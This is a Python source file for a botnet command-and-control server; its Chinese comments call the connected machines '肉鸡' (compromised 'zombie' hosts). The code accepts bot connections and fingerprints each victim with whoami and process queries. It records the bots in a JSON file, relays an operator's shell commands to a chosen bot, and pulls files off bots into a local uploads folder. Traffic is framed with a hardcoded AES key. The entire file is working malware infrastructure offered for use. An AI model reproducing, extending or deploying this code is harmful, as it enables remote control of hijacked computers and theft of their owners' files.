import base64
import json
import os
import sys
import threading
import time
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import select
import chardet  # 需要安装: pip install chardet

### 常量设置
target = ""
port = 0
flag = True
trafficSplits = [
    "###!###"
]

rouji_json_path = "rouji.json"
if os.path.exists(rouji_json_path):os.remove(rouji_json_path)
Client_roujis = dict()
# 隧道连接存储：{tunnel_id: {"local_port": int, "remote_port": int, "rouji_id": int, "tunnel_socket": socket}}
Tunnels = dict()
# 文件传输状态管理：{rouji_id: {"in_transfer": bool, "client_socket": socket, "file_handle": object, "file_size": int, "received_size": int, "save_path": str}}
transfer_states = {}

def aes_encrypt(plaintext: bytes, key: bytes) -> str:
    iv = os.urandom(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    result = base64.b64encode(iv + ciphertext).decode('utf-8')
    return result

# 每个 socket 一把发送锁，保证多线程（A 端主循环 + 文件传输线程）并发调用 send_result
# 时不会帧交错 / 部分发送
_send_locks = {}
_send_locks_guard = threading.Lock()

# P1-10: 保护共享的 Client_roujis 字典（C 监听线程写入，A 处理线程读写 / 删除时 pop）
_roujis_lock = threading.Lock()

def _get_send_lock(sock):
    with _send_locks_guard:
        lock = _send_locks.get(sock)
        if lock is None:
            lock = threading.Lock()
            _send_locks[sock] = lock
        return lock

def send_result(client_socket, result_bytes):
    # 计算数据长度
    data_length = len(result_bytes)

    # 打包长度前缀（AES 加密后固定为 44 字节）
    length_prefix = aes_encrypt(str(data_length).encode('utf-8'), b'0123456789abcdef')

    # 单帧 sendall + 每 socket 一把锁：避免两次 send 被拆开、多线程并发导致帧交错
    payload = result_bytes.encode('utf-8') if isinstance(result_bytes, str) else result_bytes
    with _get_send_lock(client_socket):
        client_socket.sendall(length_prefix.encode('utf-8') + payload)

def aes_decrypt(encrypted_data: str, key: bytes) -> bytes:
    raw_data = base64.b64decode(encrypted_data)
    iv = raw_data[:AES.block_size]
    ciphertext = raw_data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext

# 字节转为明文
def data_Byte_chardet(data_bytes):
    # 先尝试 UTF-8
    try:
        return data_bytes.decode('utf-8')
    except UnicodeDecodeError:
        # UTF-8 失败，尝试 GBK
        try:
            return data_bytes.decode('gbk')
        except UnicodeDecodeError:
            # 最后用 chardet 检测
            detected = chardet.detect(data_bytes)
            encoding = detected.get('encoding', 'utf-8')
            # 如果检测到 ascii，改用 gbk（因为 Windows 中文环境）
            if encoding.lower() == 'ascii':
                encoding = 'gbk'  # 或 'utf-8'
            return data_bytes.decode(encoding, errors='ignore')


def recv_exactly(client_socket, n):
    """循环 recv 直到收满 n 字节；对端关闭(recv 返回 b'')时抛 ConnectionError，
    避免 TCP 拆包读短 / 死循环。"""
    buf = b''
    while len(buf) < n:
        chunk = client_socket.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("对端连接已关闭")
        buf += chunk
    return buf

def recv_result(client_socket):
    # 1. 读取 44 字节 AES 加密的长度前缀（循环累积防 TCP 拆包）
    length_bytes = aes_decrypt(recv_exactly(client_socket, 44), b'0123456789abcdef')
    # 2. 解包获取实际数据长度
    data_length = int(length_bytes.decode('utf-8'))
    # 3. 根据长度读取实际数据（data_length 为 0 时返回空字节）
    return recv_exactly(client_socket, data_length) if data_length > 0 else b''

def add_rouji(rouji_ID,rouji_ip,rouji_port,user,process_name="unknown"):
    rouji_all_jsons = select_rouji_all()

    # 准备增加的rouji json
    rouji_json = {
        rouji_ID : {
            "rouji_ip":rouji_ip,
            "rouji_port":rouji_port,
            "rouji_user":user,
            "rouji_process":process_name,
            "rouji_time":time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        }
    }

    # 合并全部的rouji_json
    json_info = {**rouji_all_jsons, **rouji_json}

    # 进行更新
    update_rouji(json_info)

def delete_rouji(roujiId):
    rouji_all_jsons = select_rouji_all()

    del rouji_all_jsons[str(roujiId)]

    # 进行更新
    update_rouji(rouji_all_jsons)

def update_rouji(json_info):
    # 保存连接信息到rouji.json
    with open(rouji_json_path, 'w') as json_file:
        json.dump(json_info, json_file, indent=4)  # indent=4 用于格式化输出

def select_rouji_all():
    try:
        with open(rouji_json_path, 'r') as json_file:
            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
    except Exception:
        return {}
def rouji_json_null_check(rouji_all_jsons):
    return len(rouji_all_jsons) == 0

def select_rouji_one(roujiId):
    rouji_all_jsons = select_rouji_all()
    rouji_ids = list(rouji_all_jsons.keys())

    for rouji_id in rouji_ids:
        if rouji_id == roujiId:
            return rouji_all_jsons[rouji_id]
    return None

def forward_data(src_socket, dst_socket, direction):
    """双向数据转发（非阻塞优化版）"""
    try:
        src_socket.setblocking(False)  # 设置非阻塞模式
        dst_socket.setblocking(False)

        while True:
            # 使用select检查可读性
            readable, _, _ = select.select([src_socket], [], [], 1.0)
            if readable:
                try:
                    data = src_socket.recv(4096)
                    if not data:
                        break
                    dst_socket.sendall(data)
                except BlockingIOError:
                    continue
                except Exception as e:
                    print(f"{direction} 数据传输错误: {e}")
                    break
    except Exception as e:
        print(f"{direction} 转发错误: {e}")
    finally:
        try:
            src_socket.close()
        except:
            pass
        try:
            dst_socket.close()
        except:
            pass

def handle_file_transfer_nonblocking(rouji_id, client_a, remote_file, file_size):
    """非阻塞式文件接收处理"""
    global transfer_states

    try:
        # 检查肉鸡连接是否仍然有效
        if rouji_id not in Client_roujis:
            return False, "肉鸡连接已断开"
        
        # 检查肉鸡socket是否有效
        rouji_socket = Client_roujis[rouji_id]
        if not rouji_socket or rouji_socket.fileno() == -1:
            return False, "肉鸡socket无效"
        
        # 提取文件名并确定保存路径（P2-5：清洗文件名，确保始终落在 uploads/ 内，防路径穿越）
        filename = os.path.basename(str(remote_file).replace("\\", "/"))
        filename = filename.replace("\x00", "").strip()
        if not filename or filename in (".", ".."):
            filename = f"upload_{rouji_id}_{int(time.time())}"
        save_dir = os.path.abspath("uploads")
        save_path = os.path.abspath(os.path.join(save_dir, filename))
        # 双重保险：最终路径必须仍在 uploads 目录内
        if save_path != save_dir and not save_path.startswith(save_dir + os.sep):
            return False, "非法的文件保存路径"
        os.makedirs(save_dir, exist_ok=True)

        # 初始化传输状态
        transfer_states[rouji_id] = {
            "in_transfer": True,
            "completed": False,  # 新增：标记是否完成
            "result": None,      # 新增：存储结果消息
            "client_socket": client_a,
            "file_handle": None,
            "file_size": file_size,
            "received_size": 0,
            "save_path": save_path,
            "rouji_socket": rouji_socket,
            "start_time": time.time(),
            "last_activity_time": time.time(),
            "error_count": 0
        }

        # 发送READY确认，设置超时
        try:
            rouji_socket.settimeout(5.0)  # 5秒超时
            rouji_socket.send("READY".encode("UTF-8"))
            rouji_socket.settimeout(None)  # 恢复默认超时
        except socket.timeout:
            transfer_states[rouji_id]["in_transfer"] = False
            return False, "发送READY确认超时"
        except Exception as e:
            transfer_states[rouji_id]["in_transfer"] = False
            return False, f"发送READY确认失败: {str(e)}"

        # 启动接收线程
        transfer_thread = threading.Thread(
            target=receive_file_threaded,
            args=(rouji_id,),
            name=f"transfer_{rouji_id}"
        )
        transfer_thread.daemon = True
        transfer_thread.start()

        return True, None

    except Exception as e:
        if rouji_id in transfer_states:
            transfer_states[rouji_id]["in_transfer"] = False
        return False, str(e)

def receive_file_threaded(rouji_id):
    """后台线程接收文件"""
    global transfer_states

    state = transfer_states.get(rouji_id)
    if not state:
        return


    try:
        chunk_size = 8192  # 减少缓冲区大小到8KB，提高稳定性
        rouji_socket = state["rouji_socket"]
        client_a = state["client_socket"]
        save_path = state["save_path"]
        file_size = state["file_size"]

        # 连接健康检查
        def check_connection_health():
            """检查连接是否健康"""
            try:
                # 检查socket是否仍然有效
                if rouji_socket.fileno() == -1:
                    return False, "socket已关闭"

                return True, "连接正常"
            except Exception as e:
                return False, f"连接检查失败: {str(e)}"

        with open(save_path, 'wb') as f:
            while state["received_size"] < file_size and state["in_transfer"]:
                # 定期检查连接健康状态（每5秒检查一次）
                if time.time() - state.get("last_health_check", 0) > 5:
                    healthy, msg = check_connection_health()
                    state["last_health_check"] = time.time()
                    if not healthy:
                        print(f"连接检查失败: {msg}")
                        break

                # 使用select检查socket是否可读（缩短超时时间）
                readable, _, _ = select.select([rouji_socket], [], [], 1.0)

                if not readable:
                    # 检查是否超时（15秒无数据传输）
                    if time.time() - state["last_activity_time"] > 15:
                        print(f"文件传输超时，肉鸡ID: {rouji_id}")
                        break
                    continue  # 非阻塞，继续轮询

                try:
                    # 更新最后活动时间
                    state["last_activity_time"] = time.time()

                    # 计算剩余需要接收的数据量
                    remaining = file_size - state["received_size"]
                    recv_size = min(chunk_size, remaining)

                    # 设置接收超时（缩短到5秒）
                    rouji_socket.settimeout(5.0)
                    chunk = rouji_socket.recv(recv_size)
                    rouji_socket.settimeout(None)

                    if not chunk:
                        print(f"接收到空数据块，肉鸡ID: {rouji_id}")
                        break

                    f.write(chunk)
                    f.flush()  # 确保数据写入磁盘
                    state["received_size"] += len(chunk)
                    state["error_count"] = 0  # 重置错误计数

                    # 打印进度信息（更频繁）
                    if state["received_size"] % (chunk_size * 5) == 0:  # 每5个块打印一次
                        progress = state["received_size"] / file_size * 100
                        progress_str = f"文件传输进度: {progress:.1f}% ({state['received_size']}/{file_size})"
                        print(progress_str)
                        send_result(client_a, progress_str.encode("UTF-8"))

                except socket.timeout:
                    state["error_count"] += 1
                    print(f"接收数据超时，错误计数: {state['error_count']}")
                    if state["error_count"] >= 2:  # 减少到2次
                        print("连续2次接收超时，停止传输")
                        break
                except BlockingIOError:
                    continue
                except socket.error as e:
                    print(f"文件接收错误: {e}")
                    state["error_count"] += 1
                    if state["error_count"] >= 2:  # 减少到2次
                        print("连续2次socket错误，停止传输")
                        break
                except Exception as e:
                    print(f"文件处理错误: {e}")
                    break

        # 传输完成
        if state["received_size"] >= file_size:
            elapsed = time.time() - state["start_time"]
            speed = file_size / (elapsed + 0.001) / 1024  # KB/s
            result = f"[success] 文件上传成功: {save_path} (大小: {file_size} 字节, 耗时: {elapsed:.2f}s, 速度: {speed:.2f} KB/s)".encode("UTF-8")
            try:
                # client_a.send(result)
                send_result(client_a, result)
            except:
                pass
        else:
            error_msg = f"[fail] 文件传输不完整: 接收 {state['received_size']}/{file_size} 字节后删除".encode("UTF-8")
            try:
                # client_a.send(error_msg)
                send_result(client_a, error_msg)
            except:
                pass
    except Exception as e:
        error_msg = f"[error] 文件传输异常: {str(e)}".encode("UTF-8")
        try:
            state["client_socket"].send(error_msg)
            send_result(state["client_socket"], error_msg)
        except:
            pass
        print(f"文件传输异常: {e}")
    finally:
        send_result(state["client_socket"], "[finish]".encode("UTF-8"))
        # 清理传输状态
        if rouji_id in transfer_states:
            transfer_states[rouji_id]["in_transfer"] = False
            # 如果传输被停止，删除部分文件
            if state["received_size"] < state["file_size"]:
                try:
                    if os.path.exists(state["save_path"]):
                        os.remove(state["save_path"])
                        print(f"已删除不完整的文件: {state['save_path']}")
                except Exception as e:
                    print(f"删除不完整文件失败: {e}")

def send_http_response(client_socket, status_code=400):
    """发送HTTP错误响应"""
    responses = {
        400: b'HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\nConnection: close\r\n\r\n',
        403: b'HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n',
        404: b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n'
    }

    try:
        client_socket.send(responses.get(status_code, responses[400]))
    except:
        pass

def server_C_listen(server_C):
    global Client_roujis, flag

    while flag:
        try:
            rouji_ID = int(time.time())
            client_c, address = server_C.accept()
            print(f"[*] 接收到了客户端C的连接：来自{address[0]}的{address[1]}端口")

            process_name = "unknown"
            handshake_ok = False
            try:
                # 设置超时，避免永久阻塞
                client_c.settimeout(10.0)

                # 获取用户名
                client_c.send("whoami".encode("UTF-8"))
                response = data_Byte_chardet(recv_result(client_c))
                if not response:
                    raise socket.error("whoami 响应为空，拒绝该连接")
                user = response.strip()

                # 获取进程名称（兼容Windows和Linux）
                client_c.send("echo %PROCESSOR_ARCHITECTURE% 2>nul || uname -s".encode("UTF-8"))
                response = data_Byte_chardet(recv_result(client_c))
                if response:
                    response = response.strip()
                    if "AMD64" in response or "x86" in response:
                        client_c.send("get_Process".encode("UTF-8"))
                    else:
                        client_c.send("ps -p $ -o comm=".encode("UTF-8"))
                    process_name = data_Byte_chardet(recv_result(client_c)).strip()
                    process_name = "unknown" if not process_name else process_name
                else:
                    print("获取进程名称超时，使用默认值")

                # 恢复阻塞模式
                client_c.setblocking(True)

                # P1-11: 同一秒内多个 C 端连接可能碰撞到同一 rouji_ID，碰撞则递增；
                # P1-10: 碰撞检查 + 写入在锁内原子完成，避免竞态
                with _roujis_lock:
                    while rouji_ID in Client_roujis:
                        rouji_ID += 1
                    Client_roujis[rouji_ID] = client_c
                add_rouji(rouji_ID, address[0], address[1], user, process_name)
                handshake_ok = True

            except socket.timeout:
                print("获取用户名或进程名称超时，丢弃该连接")
            except socket.error as e:
                print(f"握手阶段连接错误，丢弃该连接: {e}")
            except Exception as e:
                print(f"获取用户信息失败: {e}")

            # P1-11: 握手未完成（空响应/超时/异常）时关闭 socket，避免连接泄漏
            if not handshake_ok:
                try:
                    client_c.close()
                except:
                    pass
        except socket.error as e:
            if not flag:
                break
            print(f"server_C_listen 错误: {e}")
            time.sleep(1)  # 避免CPU占用过高

def handle_client_a(client, address):
    """处理单个A端连接（非阻塞优化版）"""
    try:
        print(f"[*] 接收到了客户端A的连接：来自{address[0]}的{address[1]}端口")
        print("等待客户端C 的连接。。。")

        # 设置客户端A socket为非阻塞模式
        client.setblocking(False)

        while True:
            try:
                # 使用select检查socket是否可读
                readable, _, _ = select.select([client], [], [], 0.1)

                if not readable:
                    continue  # 继续轮询，不阻塞

                data = client.recv(4096)

                if not data:
                    print("A端已断开连接")
                    break

                decoded_data = data.decode("UTF-8")

                # # === 新增：优先检查是否有任何肉鸡正在传输 ===
                # for rid, state in transfer_states.items():
                #     if state.get("in_transfer", False):
                #         progress = state["received_size"] / state["file_size"] * 100
                #         busy_msg = f"肉鸡 {rid} 正在传输文件 ({progress:.1f}%)，请等待或使用 '{rid} #> get stop' 停止".encode("UTF-8")
                #         send_result(client, busy_msg)
                #         break
                # else:
                #     # 没有文件传输，正常处理命令
                #     pass

                if "exit" == decoded_data:
                    print("A端已断开连接，C端连接保持活跃")
                    break
                elif "rouji_json_xinxi" == decoded_data:
                    data = json.dumps(select_rouji_all()).encode("UTF-8")
                    send_result(client, data)
                else:
                    try:
                        rouji_commands = decoded_data.split(" #> ")
                        rouji_id = int(rouji_commands[0])

                        # P1-10: 安全取用该肉鸡 socket（肉鸡可能已被其他线程删除 / 断开）
                        with _roujis_lock:
                            target = Client_roujis.get(rouji_id)
                        if target is None:
                            send_result(client, f"肉鸡 {rouji_id} 不存在或已断开，请刷新".encode("UTF-8"))
                            continue

                        # 忙守卫（P0-5）：该肉鸡正在文件传输时，拒绝同肉鸡的其他命令，
                        # 避免普通命令的 recv_result 把文件字节流当成下一帧长度前缀，
                        # 导致 C 端协议流永久失步。仅放行 "get stop"（用于停止当前传输）。
                        if transfer_states.get(rouji_id, {}).get("in_transfer", False) and rouji_commands[1].strip() != "get stop":
                            _st = transfer_states[rouji_id]
                            _pct = _st["received_size"] / _st["file_size"] * 100 if _st.get("file_size") else 0
                            send_result(client, f"该肉鸡正在传输文件（{_pct:.1f}%，{_st['received_size']}/{_st['file_size']} 字节），请稍后，或用 '{rouji_id} #> get stop' 停止传输".encode("UTF-8"))
                            continue

                        # 判断是不是exit的rouji退出命令
                        if "exit" == rouji_commands[1]:
                            with _roujis_lock:
                                Client_roujis.pop(rouji_id, None)
                            delete_rouji(rouji_id)
                            try:
                                target.send("exit".encode("UTF-8"))
                                target.close()
                            except Exception:
                                pass
                        elif "get" in rouji_commands[1] and rouji_commands[1].startswith("get "):
                            # 停止传输命令：置 in_transfer=False，让后台接收线程尽快结束
                            if rouji_commands[1].strip() == "get stop":
                                if transfer_states.get(rouji_id, {}).get("in_transfer", False):
                                    transfer_states[rouji_id]["in_transfer"] = False
                                    send_result(client, f"肉鸡 {rouji_id} 文件传输已请求停止".encode("UTF-8"))
                                else:
                                    send_result(client, "当前没有进行中的文件传输".encode("UTF-8"))
                                continue

                            # 实现文件上传的接收操作（非阻塞优化版）
                            try:
                                parts = rouji_commands[1].split(maxsplit=1)
                                if len(parts) >= 2:
                                    remote_file = parts[1]

                                    # 转发get命令给肉鸡C
                                    target.send(rouji_commands[1].encode("UTF-8"))

                                    # 接收文件大小（使用select避免长时间阻塞）
                                    readable, _, _ = select.select([target], [], [], 5.0)
                                    if not readable:
                                        # client.send("接收文件大小超时".encode("UTF-8"))
                                        send_result(client, "接收文件大小超时".encode("UTF-8"))
                                        continue

                                    file_size_data = target.recv(1024).decode("UTF-8")
                                    file_size = int(file_size_data)

                                    # client.send(f"开始文件传输，文件大小: {file_size} 字节".encode("UTF-8"))
                                    send_result(client, f"开始文件传输，文件大小: {file_size} 字节".encode("UTF-8"))

                                    # 启动非阻塞文件传输
                                    success, error = handle_file_transfer_nonblocking(
                                        rouji_id, client, remote_file, file_size
                                    )

                                    if not success:
                                        # client.send(f"文件传输启动失败: {error}".encode("UTF-8"))
                                        send_result(client, f"文件传输启动失败: {error}".encode("UTF-8"))
                                else:
                                    # client.send("命令格式错误，请使用: get <local_file>".encode("UTF-8"))
                                    send_result(client, "命令格式错误，请使用: get <local_file>".encode("UTF-8"))
                            except Exception as e:
                                # client.send(f"文件上传失败: {str(e)}".encode("UTF-8"))
                                send_result(client, f"文件上传失败: {str(e)}".encode("UTF-8"))
                                print(f"文件上传错误: {e}")
                        else:
                            try:
                                # 发送普通命令给肉鸡C
                                target.send(rouji_commands[1].encode("UTF-8"))

                                # 使用select等待响应，避免长时间阻塞
                                # data = Client_roujis[rouji_id].recv(3072)
                                data = recv_result(target)
                                send_result(client, data)   # 发送的是字节流，接收需要解码为字符串
                                # client.send(data)
                            except Exception as e:
                                send_result(client, "命令执行超时，疑似连接断开".encode('utf-8'))

                    except Exception as e:
                        print(f"命令处理错误: {e}")
            except BlockingIOError:
                # P1-9: 非阻塞 A 端 recv 返回 EAGAIN（暂无数据）不等于断连，跳过本轮重试
                continue
            except socket.error as e:
                print(f"A端连接错误: {e}")
                break
    finally:
        try:
            client.close()
        except:
            pass

def start_server():
    global port, Client_roujis, flag

    # server_a 的连接
    server_A = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port_a = port - 1
    server_A.bind((target,port_a))
    server_A.listen(100)

    # 开启server_C
    server_C = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_C.bind((target,port))
    server_C.listen(10)
    print(f"[*] 服务端开始监听在 {port} 端口，等待客户端的连接")

    # 启动 server_C_listen 线程
    flag = True
    thread = threading.Thread(target=server_C_listen, name="server_C_listen1", args=(server_C,))
    thread.daemon = True
    thread.start()

    # 持续等待 A 端连接
    while True:
        print("等待 A 端连接...")
        try:
            client, address = server_A.accept()
            thread = threading.Thread(target=handle_client_a, args=(client, address))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"接受A端连接错误: {e}")
            time.sleep(1)

    server_C.close()
    server_A.close()

def usage():
    print("服务端监听: python3 server.py -lp 5555")

def main():
    global target
    global port

    args = sys.argv[1:]
    try:
        target = "0.0.0.0"
        port = int(args[-1])
        start_server()
    except:
        usage()

if __name__ == "__main__":
    main()